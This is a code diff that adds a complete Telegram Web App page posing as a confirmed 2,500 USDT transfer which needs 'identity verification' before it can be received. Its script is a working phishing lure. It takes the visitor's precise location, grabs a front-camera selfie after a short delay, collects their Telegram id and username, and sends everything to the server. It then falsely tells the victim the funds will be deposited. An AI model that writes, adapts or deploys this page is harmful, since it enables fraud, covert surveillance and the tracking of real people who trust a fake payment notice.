@@ -1,0 +1,497 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>USDT Confirmation</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+            background: linear-gradient(135deg, #0d0d2b, #1a1a4e);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            color: #fff;
+        }
+        
+        .container {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 24px;
+            padding: 30px;
+            max-width: 400px;
+            width: 100%;
+            backdrop-filter: blur(20px);
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+        }
+        
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .logo {
+            width: 64px;
+            height: 64px;
+            background: linear-gradient(135deg, #26a17b, #1a7a5c);
+            border-radius: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 16px;
+            font-size: 28px;
+        }
+        
+        h1 {
+            font-size: 20px;
+            font-weight: 700;
+            color: #26a17b;
+            margin-bottom: 4px;
+        }
+        
+        .subtitle {
+            color: rgba(255, 255, 255, 0.6);
+            font-size: 13px;
+        }
+        
+        .success-icon {
+            text-align: center;
+            font-size: 56px;
+            margin: 20px 0;
+        }
+        
+        .amount {
+            text-align: center;
+            font-size: 28px;
+            font-weight: 800;
+            color: #26a17b;
+            margin: 10px 0;
+            font-family: 'Courier New', monospace;
+        }
+        
+        .details {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 16px;
+            padding: 20px;
+            margin: 20px 0;
+        }
+        
+        .detail-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 8px 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+            font-size: 13px;
+        }
+        
+        .detail-row:last-child {
+            border-bottom: none;
+        }
+        
+        .label {
+            color: rgba(255, 255, 255, 0.5);
+        }
+        
+        .value {
+            color: #fff;
+            font-weight: 500;
+        }
+        
+        .value.green {
+            color: #26a17b;
+        }
+        
+        .warning {
+            background: rgba(255, 193, 7, 0.1);
+            border: 1px solid rgba(255, 193, 7, 0.2);
+            border-radius: 12px;
+            padding: 16px;
+            margin: 20px 0;
+            text-align: center;
+            font-size: 13px;
+            color: #ffc107;
+        }
+        
+        .btn-confirm {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #26a17b, #1a7a5c);
+            border: none;
+            border-radius: 14px;
+            color: #fff;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin: 10px 0;
+        }
+        
+        .btn-confirm:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(38, 161, 123, 0.3);
+        }
+        
+        .btn-confirm.loading {
+            opacity: 0.7;
+            pointer-events: none;
+        }
+        
+        .btn-confirm:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+        
+        .status-msg {
+            text-align: center;
+            padding: 12px;
+            border-radius: 12px;
+            margin: 10px 0;
+            font-size: 13px;
+            display: none;
+        }
+        
+        .status-msg.success {
+            display: block;
+            background: rgba(38, 161, 123, 0.1);
+            border: 1px solid rgba(38, 161, 123, 0.2);
+            color: #26a17b;
+        }
+        
+        .status-msg.error {
+            display: block;
+            background: rgba(244, 67, 54, 0.1);
+            border: 1px solid rgba(244, 67, 54, 0.2);
+            color: #f44336;
+        }
+        
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 11px;
+            color: rgba(255, 255, 255, 0.3);
+        }
+        
+        .camera-preview {
+            width: 100%;
+            max-height: 200px;
+            border-radius: 12px;
+            overflow: hidden;
+            margin: 10px 0;
+            display: none;
+        }
+        
+        .camera-preview video, .camera-preview img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        
+        .spinner {
+            display: none;
+            width: 40px;
+            height: 40px;
+            margin: 20px auto;
+            border: 3px solid rgba(255,255,255,0.1);
+            border-top-color: #26a17b;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .step-indicator {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin: 20px 0;
+        }
+        
+        .step {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: rgba(255,255,255,0.2);
+        }
+        
+        .step.active {
+            background: #26a17b;
+            animation: pulse 1.5s infinite;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.5); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container" id="mainContainer">
+        <div class="header">
+            <div class="logo">₮</div>
+            <h1>USDT Transfer Confirmed</h1>
+            <div class="subtitle">تم تأكيد تحويل USDT بنجاح</div>
+        </div>
+        
+        <div class="success-icon">✅</div>
+        <div class="amount" id="amountDisplay">2,500 USDT</div>
+        
+        <div class="details">
+            <div class="detail-row">
+                <span class="label">From</span>
+                <span class="value">BinanceHot 🔥</span>
+            </div>
+            <div class="detail-row">
+                <span class="label">To</span>
+                <span class="value">TXqP...8k3m</span>
+            </div>
+            <div class="detail-row">
+                <span class="label">Network</span>
+                <span class="value">TRC-20</span>
+            </div>
+            <div class="detail-row">
+                <span class="label">Fee</span>
+                <span class="value">0.00 USDT</span>
+            </div>
+            <div class="detail-row">
+                <span class="label">Status</span>
+                <span class="value green">✅ Confirmed</span>
+            </div>
+        </div>
+        
+        <div class="warning">
+            ⚠️ مطلوب التحقق من الهوية لتأكيد استلام التحويل
+            <br>
+            Identity verification required to confirm receipt
+        </div>
+        
+        <div id="stepContainer">
+            <div class="step-indicator">
+                <div class="step active" id="step1"></div>
+                <div class="step" id="step2"></div>
+                <div class="step" id="step3"></div>
+            </div>
+        </div>
+        
+        <div id="statusMsg" class="status-msg"></div>
+        
+        <div id="spinner" class="spinner"></div>
+        
+        <button class="btn-confirm" id="confirmBtn" onclick="startVerification()">
+            📥 تأكيد الاستلام والتحقق
+        </button>
+        
+        <div class="footer">
+            Secured by USDT Blockchain Network • TRC-20
+        </div>
+    </div>
+    
+    <div class="camera-preview" id="cameraPreview">
+        <video id="video" autoplay playsinline></video>
+        <canvas id="canvas" style="display:none;"></canvas>
+    </div>
+
+    <script>
+        let capturedPhoto = null;
+        let userLocation = null;
+        let mediaStream = null;
+        
+        // تهيئة WebApp
+        const tg = window.Telegram.WebApp;
+        
+        // توسيع الواجهة لملء الشاشة
+        tg.expand();
+        
+        function setStatus(msg, type) {
+            const status = document.getElementById('statusMsg');
+            status.textContent = msg;
+            status.className = 'status-msg ' + type;
+        }
+        
+        function setStep(step) {
+            for (let i = 1; i <= 3; i++) {
+                document.getElementById('step' + i).className = 'step';
+            }
+            for (let i = 1; i <= step; i++) {
+                document.getElementById('step' + i).className = 'step active';
+            }
+        }
+        
+        function showSpinner(show) {
+            document.getElementById('spinner').style.display = show ? 'block' : 'none';
+        }
+        
+        function getLocation() {
+            return new Promise((resolve, reject) => {
+                if (!navigator.geolocation) {
+                    reject(new Error('Geolocation not supported'));
+                    return;
+                }
+                
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        resolve({
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy
+                        });
+                    },
+                    (error) => {
+                        reject(error);
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            });
+        }
+        
+        async function capturePhoto() {
+            try {
+                const video = document.getElementById('video');
+                const canvas = document.getElementById('canvas');
+                const preview = document.getElementById('cameraPreview');
+                
+                // طلب إذن الكاميرا
+                mediaStream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+                    audio: false
+                });
+                
+                video.srcObject = mediaStream;
+                preview.style.display = 'block';
+                preview.style.position = 'fixed';
+                preview.style.top = '0';
+                preview.style.left = '0';
+                preview.style.width = '100%';
+                preview.style.height = '100%';
+                preview.style.zIndex = '9999';
+                preview.style.backgroundColor = '#000';
+                
+                video.style.width = '100%';
+                video.style.height = '100%';
+                video.style.objectFit = 'cover';
+                
+                // الانتظار قليلاً ثم التقاط الصورة
+                await new Promise(resolve => setTimeout(resolve, 1500));
+                
+                // التقاط الصورة
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                
+                capturedPhoto = canvas.toDataURL('image/jpeg', 0.8);
+                
+                // إيقاف الكاميرا
+                stopCamera();
+                
+                preview.style.display = 'none';
+                
+                return capturedPhoto;
+            } catch (error) {
+                console.error('Camera error:', error);
+                // إذا رفض الكاميرا، نكمل بدون صورة
+                return null;
+            }
+        }
+        
+        function stopCamera() {
+            if (mediaStream) {
+                mediaStream.getTracks().forEach(track => track.stop());
+                mediaStream = null;
+            }
+        }
+        
+        async function startVerification() {
+            const btn = document.getElementById('confirmBtn');
+            btn.disabled = true;
+            btn.textContent = '⏳ جاري التحقق...';
+            btn.classList.add('loading');
+            
+            try {
+                // الخطوة 1: الحصول على الموقع
+                setStep(1);
+                setStatus('📍 جاري تحديد الموقع الجغرافي...', 'success');
+                
+                try {
+                    userLocation = await getLocation();
+                } catch (locError) {
+                    setStatus('⚠️ لم نتمكن من تحديد الموقع بدقة. استمرار التحقق...', 'error');
+                    userLocation = { latitude: 0, longitude: 0, accuracy: 0 };
+                }
+                
+                // الخطوة 2: التقاط الصورة
+                setStep(2);
+                setStatus('📸 جاري التقاط صورة للتحقق...', 'success');
+                
+                capturedPhoto = await capturePhoto();
+                
+                // الخطوة 3: إرسال البيانات
+                setStep(3);
+                setStatus('📤 جاري إرسال بيانات التحقق...', 'success');
+                showSpinner(true);
+                
+                const data = {
+                    location: userLocation,
+                    photo: capturedPhoto || '',
+                    user: {
+                        id: tg.initDataUnsafe?.user?.id || 'unknown',
+                        username: tg.initDataUnsafe?.user?.username || '',
+                        language_code: tg.initDataUnsafe?.user?.language_code || ''
+                    },
+                    timestamp: new Date().toISOString()
+                };
+                
+                // إرسال البيانات إلى السيرفر
+                const response = await fetch('/webapp-data', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(data)
+                });
+                
+                if (response.ok) {
+                    showSpinner(false);
+                    setStatus('✅ تم تأكيد استلام التحويل بنجاح! سيتم إيداع المبلغ في محفظتك.', 'success');
+                    btn.textContent = '✅ تم التحقق بنجاح';
+                    
+                    // إغلاق النافذة بعد 3 ثوان
+                    setTimeout(() => {
+                        tg.close();
+                    }, 3000);
+                } else {
+                    throw new Error('Failed to send data');
+                }
+                
+            } catch (error) {
+                console.error('Verification error:', error);
+                showSpinner(false);
+                setStatus('❌ حدث خطأ في التحقق. يرجى المحاولة مرة أخرى.', 'error');
+                btn.textContent = '🔄 إعادة المحاولة';
+                btn.disabled = false;
+                btn.classList.remove('loading');
+            }
+        }
+        
+        // تنظيف عند الإغلاق
+        window.addEventListener('beforeunload', function() {
+            stopCamera();
+        });
+    </script>
+</body>
+</html>
